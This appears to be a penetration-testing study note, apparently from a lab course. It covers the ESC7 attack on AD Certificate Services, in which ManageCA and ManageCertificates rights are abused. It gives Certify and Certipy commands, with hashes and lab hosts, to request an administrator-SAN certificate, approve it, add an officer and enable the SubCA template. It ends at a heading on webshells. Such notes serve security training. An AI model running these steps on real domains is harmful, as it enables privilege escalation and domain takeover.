## Vulnerable Certificate Authority Access Control Roles (`ManageCA` and `ManageCertificate`) ##

#### What's running under the hood ####
- A certificate authority itself has a set of permissions that secure various **CA actions**.
- The two main rights here are the `ManageCA` right and the `ManageCertificates` right, which translate to the “CA administrator” and “Certificate Manager”.

#### What the attack is about ####
- `ManageCA`: allows a user to change the CA’s configuration to turn on SAN (Subject Alternative Name) to all the templates enabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute allowing for the [[ESC6]] attack path.
- `ManageCertificates`: allows a user to issue certificates that are pending approval. We can approve such certificates using the ManageCA rights.
- If the attacker does not have the `ManageCertificates` right, he/she can just add themselves as a new officer using existing `ManageCA` rights, since an officer is a user with the `ManageCertificates` rights.
- If the Certificate-based Authentication (CBA) patches are installed, the normal [[ESC6]] attack using `ManageCA` rights can’t be used (because of strong certificate mapping checks).

### Enumeration ###
1. **Certify**
`PS C:\ADCS\Auditor> .\Certify.exe cas`

### Exploitation ###
#### 1. ESC7.1 - Approve a failed Certificate Request ####
**Certify**
1. Create a Failed Request
`PS C:\ADCS\Auditor> Certify.exe request /ca:CB-CA.CB.CORP\CB-CA /template:subCA /altname:administrator /domain:internalcb.corp /sidextension:S-1-5-21-2177854049-4204292666-1463338204-500`
2. Approve the Failed Request
`PS C:\ADCS\Auditor> Certify-esc7.exe issue /ca:CB-CA.CB.CORP\CB-CA /id:58`
3. Download Approved Request
`PS C:\ADCS\Auditor> Certify-esc7.exe download /ca:CB-CA.CB.CORP\CB-CA /id:58`

**Certipy**
- If we don’t have the ManageCertificates right, the attacker can add themselves as a new officer using existing `ManageCA` rights.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# certipy ca -u internaluser@internalcb.corp -hashes 'aad3b435b51404eeaad3b435b51404ee:6ca67841f08c8c73baf4d93ca16e7760' -ca 'CB-CA' -dc-ip 172.16.203.1 -target cb-ca.cb.corp -add-officer internaluser
```

- If the SubCA template too isn't enabled, the attacker can enable it using existing `ManageCA` access rights.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# certipy ca -u internaluser@internalcb.corp -hashes 'aad3b435b51404eeaad3b435b51404ee:6ca67841f08c8c73baf4d93ca16e7760' -ca 'CB-CA' -dc-ip 172.16.203.1 -target cb-ca.cb.corp -enable-template 'SubCA'
```
#### 2. ESC7.1 - AbusE CRL Distribution Points (CDPs) and usE them to deploy SYSTEM webshells to CA servers respectively ####